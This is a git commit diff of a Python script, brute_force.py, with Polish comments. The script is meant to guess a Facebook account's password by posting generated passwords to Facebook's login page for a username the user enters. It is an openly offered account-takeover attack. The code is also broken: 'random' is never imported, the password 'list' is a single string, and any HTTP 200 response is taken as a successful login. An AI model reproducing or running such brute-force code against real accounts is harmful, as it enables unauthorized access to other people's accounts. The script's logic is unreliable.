d546898ea6308f0231aeb32a9e8c7ad77e92f54c
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-21 01:48:24 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,36 +1,55 @@
 import requests
 import time
 import re
+from bcrypt import hashpw, checkpw
 
-def brute_force(username, password, fb_id):
-    url = "https://www.facebook.com/login.php"
-    payload = {
-        "email": username,
-        "password": password,
-        "login": "Log In"
-    }
-    response = requests.post(url, data=payload)
+def verify_password(password, hashed_password):
+    return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))
 
-    if response.status_code != 200:
-        print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
-        return False
+def generate_passwords(length=12, symbols=True, numbers=True, uppercase=True, lowercase=True):
+    characters = []
+    if symbols:
+        characters += ['!', '@', '#', '$', '%', '&', '(', ')', '*', '+']
+    if numbers:
+        characters += ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+    if uppercase:
+        characters += [chr(i) for i in range(ord('A'), ord('Z') + 1)]
+    if lowercase:
+        characters += [chr(i) for i in range(ord('a'), ord('z') + 1)]
+    return ''.join([random.choice(characters) for _ in range(length)])
 
-    if not re.match(r'^[0-9]+$', fb_id):
-        print("Nieprawidłowy identyfikator Facebooka.")
-        return False
+def brute_force(username, fb_id, passwords):
+    for password in passwords:
+        # Wykonaj zapytanie do Facebooka
+        response = requests.post('https://www.facebook.com/login.php', data={
+            'email': username,
+            'password': password,
+            'login': 'Log In'
+        })
 
-    print("Znaleziono hasło:", password)
-    return True
+        # Sprawdź odpowiedź
+        if response.status_code == 200:
+            # Hasło zostało znalezione
+            print('Znaleziono hasło:', password)
+            return
+
+        # Hasło nie zostało znalezione
+        print('Nieprawidłowe hasło:', password)
 
 def main():
-    # Replace the placeholders with your actual Facebook account information
-    username = "twoja_nazwa_użytkownika"
-    password = "twoje_hasło"
-    fb_id = "twój_id_facebooka"
+    # Pobierz dane użytkownika
+    username = input('Podaj nazwę użytkownika: ')
+    fb_id = input('Podaj identyfikator Facebooka: ')
 
-    brute_force(username, password, fb_id)
+    # Wygeneruj listę haseł
+    passwords = generate_passwords(length=12, symbols=True, numbers=True, uppercase=True, lowercase=True)
 
-main()
+    # Wykonaj atak siłowy
+    brute_force(username, fb_id, passwords)
+
+if __name__ == '__main__':
+    main()
+
 
 
 
